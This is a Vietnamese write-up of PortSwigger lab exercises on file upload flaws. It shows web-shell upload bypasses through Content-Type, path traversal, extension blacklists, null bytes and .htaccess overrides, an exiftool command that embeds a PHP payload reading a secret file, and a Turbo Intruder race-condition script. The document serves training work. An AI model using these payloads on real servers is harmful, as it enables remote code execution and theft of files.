# WEB 04: File upload vulnerabilities

## Lab 01: Remote code execution via web shell upload

Tại lab này, server không thực hiện bất kể biện pháp phòng thủ nào nên tiến hành upload file exploit lên luôn

![](./images/image.png)

![](./images/image-1.png)

## Lab 02: Web shell upload via Content-Type restriction bypass

Ở lab này server chỉ cho upload các file có type là image/jpeg và image/png

![](./images/image-2.png)

Thay đổi lại type file

![](./images/image-3.png)

Upload lại

![](./images/image-4.png)

## Lab 03: Web shell upload via path traversal

![](./images/image-5.png)

Như ảnh trên, mặc dù file php được upload nhưng lại không được thực thi. 

![](./images/image-6.png)

Đúng như dự đoán, file <b>.htaccess</b> đã được đặt tại thư mục <b>files</b> và được config để mọi file trong <b>files</b> đều chỉ là file <b>static</b>

```
<Directory /var/www/files/avatars>
    SetHandler default-handler

</Directory>
```

Trong đầu mình lúc này có 2 cách làm:

### Case 1: Sử dụng kỹ thuật Path Traversal

Bạn đã biết file được lưu tại <b>/files/avatars/exp.php</b>

Nếu filename là: <b>../exp.php</b> thì file sẽ được lưu tại <b>/files/avatars/../exp.php</b>

Tức là <b>/files/exp.php</b>

![](./images/image-8.png)

### Case 2: Upload .htaccess để override lại cấu hình

Upload file <b>.htaccess</b> lên <b>avatars</b> để override lại cấu hình của <b>.htaccess</b> trong <b>files</b>

```
<FileMatch ".+\.ngn$">
	SetHandler application/x-httpd-php
</FileMatch>
```
Đoạn config trên nghĩa là bắt lại mọi file có đuôi là <b>ngn</b> và cho phép thực thi chúng như 1 file php

Nhưng điều đó chỉ dừng lại ở ý tưởng, vì server đã ngăn không cho upload <b>.htaccess</b> 😭😭😭

![](./images/image-9.png)

## Lab 03: Web shell upload via extension blacklist bypass

Lab này có 1 blacklist extension

Tiến hành kiểm tra 1 số ext phổ biến có thể thực thi được php

![](./images/image-10.png)

=> ext <b>.phar</b> không bị đưa vào blacklist

![](./images/image-11.png)

## Lab 04: Web shell upload via obfuscated file extension

![](./images/image-12.png)

Có thể thấy, mặc dù đã sửa các bit đầu của file là gif nhưng có lẽ server chỉ kiểm tra đuôi file mà không phải kiểm tra type file

Nếu ta sử dụng ký tự null byte <b>exp.php%00.jpg</b>

Lúc này, code php sẽ kiểm tra và ext là jpg => đúng, cho qua

httpd mod apache sẽ kiểm tra và nhận thấy ký tự null byte => tên file mà httpd nhận được sẽ là <b>exp.php</b>

![](./images/image-13.png)

Kết quả:

![](./images/image-14.png)

## Lab 05: Remote code execution via polyglot web shell upload
![](./images/image-16.png)

![](./images/image-15.png)

Có thể thấy server đã không check phần đuôi file, ta vẫn có thể upload file php được

Nhưng server lại check rất kỹ phần nội dung của file để xác định đó chính xác là 1 file ảnh mà không phải có nội dung là text

Chính vì php vẫn được upload và được thực thi nên ta sử dụng exiftool để thêm 1 comment vào nội dung ảnh có đuôi file là <b>.php</b>.

![](./images/image-18.png)

```
exiftool -Comment="<?php echo 'GET SECRET ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" ptit.png -o exp.php
```
![](./images/image-20.png)

Kết quả:

![](./images/image-21.png)

## Lab 06: Web shell upload via race condition

```php
<?php
$target_dir = "avatars/";
$target_file = $target_dir . $_FILES["avatar"]["name"];

// temporary move
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
} else {
    unlink($target_file);
    echo "Sorry, there was an error uploading your file.";
    http_response_code(403);
}

function checkViruses($fileName) {
    // checking for viruses
    ...
}

function checkFileType($fileName) {
    $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
    if($imageFileType != "jpg" && $imageFileType != "png") {
         echo "Sorry, only JPG & PNG files are allowed\n";
        return false;
    } else {
        return true;
    }
}
?>
```

Ở đoạn code trên có thể thấy server lưu file tải lên rồi mới kiểm tra file, nếu file là độc hại thì mới xóa file, nếu không độc hại thì giữ nguyên

Vậy sẽ ra sao nếu như khi file tải lên vừa được lưu thì ta request tới file đấy luôn?

Trong khoảng thời gian từ lúc bắt đầu đến trước khi hoàn thành việc kiểm tra virus ta đều có thể request để lấy file đã tải

Vậy nên ta gửi đồng thời reuqest tải file và lấy file cùng 1 lúc bằng cách sử dụng <b>turbo intruder</b>

Send request tới turbo intruder

![](./images/image-22.png)

![](./images/image-23.png)

Với payload do PortSwigger cung cấp:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''<YOUR-POST-REQUEST>'''

    request2 = '''<YOUR-GET-REQUEST>'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
``` 

![](./images/image-24.png)

Với <b><YOUR-POST-REQUEST></b> là request post file <b>exp.php</b>

<b><YOUR-GET-REQUEST></b> là reuqest get file <b>exp.php</b>

![](./images/image-25.png)

Sau đó nhấn attack

Đoạn code trên sẽ đưa request post vào đầu hàng đợi cùng với đó là 5 request get để tăng xác xuất get được file trước khi bị xóa

Kết quả:

![](./images/image-26.png)

